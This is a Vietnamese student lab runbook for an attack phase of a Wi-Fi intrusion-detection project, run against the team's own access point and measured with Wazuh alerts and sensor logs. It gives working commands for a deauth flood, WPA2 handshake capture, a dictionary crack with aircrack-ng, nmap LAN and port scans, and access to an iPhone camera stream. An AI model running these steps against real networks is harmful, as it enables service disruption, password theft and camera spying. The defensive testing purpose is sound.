# Phase 03 — Thực hiện tấn công: Từ phá khóa Wi-Fi đến lộ Camera nội bộ (Huy chủ trì)

> **Phụ thuộc:** Phase 00 + Phase 02 phải hoàn tất.  
> **Mục tiêu:** Chạy trọn vẹn mạch tấn công thực nghiệm (Màn 0 → Màn 1 → Màn 2 → Màn 3 → Màn 4), thu thập log cảm biến, cảnh báo Wazuh và bằng chứng hình ảnh camera.  
> **Nguyên tắc vàng:** **Hưng (Sensor) + Khang (Wazuh) phải bật ghi TRƯỚC khi Huy (Attacker) bấm lệnh tấn công.**  
> **Tham chiếu:** [`docs/03-kich-ban/kich-ban-demo.md`](../kich-ban-demo.md) (Mục 3 & Mục 4).

---

## ⏸️ Màn phụ WPS — ĐỂ SAU

Theo thống nhất của nhóm, **màn phụ WPS (`wash` + `reaver`) tạm gác sang một bên** trong luồng chạy chính dưới đây để không làm gián đoạn mạch `Recon → Deauth → Handshake → Quét LAN & Xem Camera`. Màn WPS chỉ cần thực hiện bổ sung trước khi bước vào mục "Tắt WPS" ở [Phase 04](phase-04-phong-thu.md).

## 📌 Trạng thái thực tế & Lưu ý từ phiên test 16/11/2026

- Đã test thành công Deauth qua AirHunt vào BSSID `ac:15:a2:80:26:99` (kênh 7) → Wazuh Dashboard nổ **5,000+ cảnh báo mức 12 (Rule 100111 — Deauth flood)** đúng khung giờ tấn công.
- **Lưu ý 1 (Khắc phục lỗi của AirHunt):** Hàm `start_monitor_mode()` của AirHunt thiếu lệnh `airmon-ng check kill`. Huy **bắt buộc chạy tay `sudo airmon-ng check kill`** trước khi mở AirHunt để tránh lỗi kẹt ở `"Waiting for beacon frame"`.
- **Lưu ý 2 (Chế độ Deauth):** Trong AirHunt (hoặc khi chạy `aireplay-ng`), ưu tiên chọn chế độ **Deauth đúng 1 client (`-c <CLIENT_MAC>` của iPhone)** để khớp chuẩn với Rule `100111` (`<same_field>client</same_field>`) và tránh làm nhiễu số liệu đo.

---

## Checklist tuần tự

- [ ] **Bước 0 (Hưng + Khang — Bật giám sát trước):**
      - Hưng chạy cảm biến `sudo python3 code/sensor/sensor-wids.py <iface_mon>` (bản đã lọc BSSID theo Phase 02 Bước 1b) và mở thêm cửa sổ `sudo tail -F /var/log/wifi-wids.log`.
      - Khang mở sẵn Wazuh Dashboard (chế độ tự làm mới hoặc theo dõi real-time) và mở cửa sổ xem luồng camera `DEMO-01` từ iPhone.  
      → **Báo OK** cho Huy khi cả cảm biến, Wazuh và camera đều đang chạy.

- [ ] **Bước 1 — Màn 0 (Baseline, Khang + Hưng):**
      - Giữ iPhone truyền video camera bình thường trong 2–3 phút, không có thao tác tấn công.
      - Khang xác nhận Wazuh Dashboard **sạch (0 cảnh báo)** trên BSSID của lab.  
      → **Báo OK** kèm ảnh chụp màn hình Dashboard trạng thái sạch.

- [ ] **Bước 2 — Màn 1 (Trinh sát vô tuyến / Recon, Huy):**
      - Huy chạy `sudo airmon-ng check kill`, mở **AirHunt** (`sudo python3 AirHunt.py`) hoặc `sudo airodump-ng <iface_mon>` để quét mạng xung quanh.
      - Xác định đúng dòng AP của nhóm (`Lab-Cafe-Wifi` / `WISE-Cafe-Staff`), ghi lại: `BSSID` (`AC:15:A2:80:26:99`), `CH` (kênh), `ENC` (`WPA2`), và địa chỉ MAC của iPhone ở bảng `STATION` (`<CLIENT_MAC>`).  
      → **Báo OK** kèm ảnh chụp dòng AP + Client. Khang xác nhận Wazuh không sinh cảnh báo (ghi nhận giới hạn tự nhiên đối với trinh sát thụ động).

- [ ] **Bước 3 — Màn 2 (Tấn công Deauth Flood & Đo cảnh báo Wazuh, Huy + Khang):**
      - **Cửa sổ 1 (Huy):** Bật chức năng thu Handshake trong AirHunt (hoặc `sudo airodump-ng --bssid AC:15:A2:80:26:99 -c <kênh> -w lab/weak/capture <iface_mon>`) để chờ bắt gói khi iPhone kết nối lại.
      - **Cửa sổ 2 (Huy):** Ghi lại **giờ bấm lệnh chính xác (tới từng giây)** rồi bắn Deauth nhắm vào iPhone:
        ```bash
        sudo aireplay-ng --deauth 20 -a AC:15:A2:80:26:99 -c <CLIENT_MAC> <iface_mon>
        ```
      - **Quan sát:** Luồng video từ iPhone bị gián đoạn tạm thời rồi iPhone tự kết nối lại.  
      → **Huy báo OK** kèm mốc giờ bắn lệnh và xác nhận góc trên phải Cửa sổ 1 đã hiện **`WPA handshake: AC:15:A2:80:26:99`**.  
      → **Khang báo OK** kèm mốc giờ **Rule `100111` (Level 12 — Deauth flood)** xuất hiện trên Wazuh Dashboard + ảnh chụp cảnh báo.

- [ ] **Bước 4 — Màn 3 (Crack mật khẩu WPA2 yếu từ Handshake, Huy):**
      - Huy dừng cửa sổ thu gói (`Ctrl+C`), kiểm tra file `lab/weak/capture-01.cap`.
      - Dùng chức năng Crack Handshake bằng Wordlist trong AirHunt (hoặc gọi trực tiếp `aircrack-ng`):
        ```bash
        # Nếu dùng mật khẩu có trong rockyou.txt (vd: 12345678):
        sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AC:15:A2:80:26:99 lab/weak/capture-01.cap

        # Hoặc nếu dùng mật khẩu kịch bản quán cà phê (CafeDemo2026) với tập từ điển demo:
        mkdir -p lab/weak lab/strong
        printf '%s\n' CafeDemo2024 CafeDemo2025 CafeDemo2026 > lab/demo-wordlist.txt
        sudo aircrack-ng -w lab/demo-wordlist.txt -b AC:15:A2:80:26:99 lab/weak/capture-01.cap
        ```
      → **Báo OK** kèm ảnh chụp màn hình **`KEY FOUND!`** và thời gian dò mật khẩu.

- [ ] **Bước 5 — Màn 4 (Hậu quả: Vào Wi-Fi, dùng Nmap quét LAN & Mở Camera iPhone, Huy + Khang):**
      1. **Huy** tắt Monitor Mode (`sudo airmon-ng stop <iface_mon>` && `sudo systemctl start NetworkManager`), kết nối Wi-Fi laptop vào mạng `Lab-Cafe-Wifi` / `WISE-Cafe-Staff` bằng mật khẩu vừa crack được ở Bước 4 (rút dây LAN trên máy Huy nếu có).
      2. **Huy** kiểm tra dải IP nội bộ nhận được:
         ```bash
         ip -4 addr
         ip -4 route
         ```
      3. **Huy** dùng **Nmap** quét tìm các thiết bị đang hoạt động trong mạng LAN (`192.168.0.0/24`):
         ```bash
         sudo nmap -sn 192.168.0.0/24
         ```
      4. Loại trừ IP của Router (`.1`), máy Hưng (`.100`), máy Khang (`.102`) và máy Huy, **Huy** quét cổng dịch vụ trên IP của iPhone (ví dụ `192.168.0.101`):
         ```bash
         nmap -sV --version-light -p 80,443,554,8000,8080,8081,8888 192.168.0.101
         # Nếu chưa thấy cổng trong danh sách phổ biến, quét toàn bộ cổng TCP đang mở:
         nmap -sT -p- --open 192.168.0.101
         ```
      5. **Huy** mở trình duyệt truy cập `http://<IP_iPhone>:<PORT>` vừa tìm được → thấy hình ảnh tờ giấy **`DEMO-01`** trực tiếp từ camera của quán!
      6. **Kiểm chứng trực tiếp:** Huy yêu cầu **Khang** đổi tờ giấy trước ống kính iPhone từ **`DEMO-01`** sang **`DEMO-02`**. Huy chụp ảnh màn hình trình duyệt thấy rõ mã **`DEMO-02`**.  
      → **Báo OK** kèm bộ bằng chứng: kết quả `nmap`, URL camera tìm được, ảnh chụp trình duyệt thấy `DEMO-02`, và xác nhận của Hưng/Khang rằng cảm biến WIDS tầng 2 không phát hiện bước quét Nmap/HTTP này.

---

## Verify (Điều kiện qua Phase 03)

- [ ] Có đủ log của Hưng (`/var/log/wifi-wids.log`), cảnh báo **Rule 100111** trên Wazuh của Khang, khớp với mốc thời gian Deauth của Huy.
- [ ] Có ảnh chụp bắt được Handshake và kết quả `KEY FOUND!` với mật khẩu yếu.
- [ ] Có đầu ra lệnh `nmap` tìm thấy cổng HTTP trên iPhone và ảnh trình duyệt máy Huy xem trực tiếp mã cảnh `DEMO-02`.

## Ship

Bàn giao toàn bộ mốc thời gian, file log và ảnh chụp màn hình của Màn 0 → Màn 4 để sang [Phase 04 (Phòng thủ)](phase-04-phong-thu.md) và [Phase 05 (Đo lường)](phase-05-do-luong.md).
